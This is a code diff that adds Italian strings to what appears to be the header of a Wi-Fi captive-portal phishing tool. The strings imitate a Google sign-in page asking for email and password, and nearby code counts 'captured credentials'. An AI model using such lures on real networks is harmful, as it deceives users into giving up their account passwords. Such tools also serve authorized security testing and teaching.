@@ -39,6 +39,16 @@
 #define LOGIN_BUTTON "Weiter"
 #define LOGIN_AFTER_MESSAGE "Daten werden geprüft..."
 #define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+
+#elif defined(LANGUAGE_IT_IT)
+#define LOGIN_TITLE "Accedi"
+#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
+#define LOGIN_PASSWORD_PLACEHOLDER "Password"
+#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
+#define LOGIN_BUTTON "Avanti"
+#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
+#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
